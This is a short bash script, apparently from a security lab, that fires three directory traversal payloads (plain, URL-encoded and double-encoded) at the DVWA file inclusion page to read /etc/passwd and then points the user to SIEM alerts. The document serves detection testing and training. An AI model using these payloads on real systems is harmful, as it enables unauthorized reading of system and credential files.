## attack-scripts/traversal_test.sh

#!/bin/bash
# Directory Traversal Simulation

TARGET=$1

if [ -z "$TARGET" ]; then
  echo "Usage: ./traversal_test.sh <target-ip>"
  exit 1
fi

echo "[*] Starting Directory Traversal test on $TARGET"

# Normal traversal
curl -s "http://$TARGET/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd"

# URL encoded
curl -s "http://$TARGET/DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double encoded
curl -s "http://$TARGET/DVWA/vulnerabilities/fi/?page=%252e%252e%252fetc%252fpasswd"

echo "[+] Done. Check SIEM for traversal alerts."

